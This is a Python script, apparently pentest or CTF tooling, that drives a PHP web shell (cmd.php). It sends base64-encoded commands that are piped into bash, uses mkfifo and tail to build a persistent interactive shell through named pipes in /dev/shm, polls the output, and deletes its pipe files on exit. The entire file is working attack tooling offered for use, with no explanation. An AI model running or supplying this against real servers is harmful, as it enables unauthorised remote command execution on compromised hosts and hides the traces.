#!/usr/bin/python3

import requests, time, threading, signal, sys
from base64 import b64encode
from random import randrange

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    RunCmd(erasestdin)
    RunCmd(erasestdout)
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
main_url = "http://localhost/cmd.php"
session = randrange(1000, 9999)
stdin = "/dev/shm/%s.input" % session
stdout = "/dev/shm/%s.output" % session
erasestdin = "/bin/rm %s" % stdin
erasestdout = "/bin/rm %s" % stdout

class AllTheReads(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        clearoutput = "echo '' > %s" % stdout
        readoutput = "/bin/cat %s" % stdout

        while True:
            output = RunCmd(readoutput)

            if output:
                RunCmd(clearoutput)
                print(output)

            time.sleep(self.interval)

def RunCmd(cmd):
    cmd = cmd.encode()
    cmd = b64encode(cmd).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d | bash' % cmd
    }

    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
    return r

def SetupShell():
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
    try:
        RunCmd(NamedPipes)
    except:
        pass
    return None

def WriteCmd(cmd):
    cmd = cmd.encode()
    cmd = b64encode(cmd).decode()

    post_data = {
        'cmd': 'echo %s | base64 -d > %s' % (cmd, stdin)
    }

    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
    return r

def ReadCmd():
    readoutput = "/bin/cat %s" % stdout
    output = RunCmd(readoutput)
    return output

if __name__ == '__main__':
    SetupShell()
    ReadAllTheThings = AllTheReads()

    while True:
        cmd = input("webshell:~$ ")
        WriteCmd(cmd + "\n")
        time.sleep(1.1)
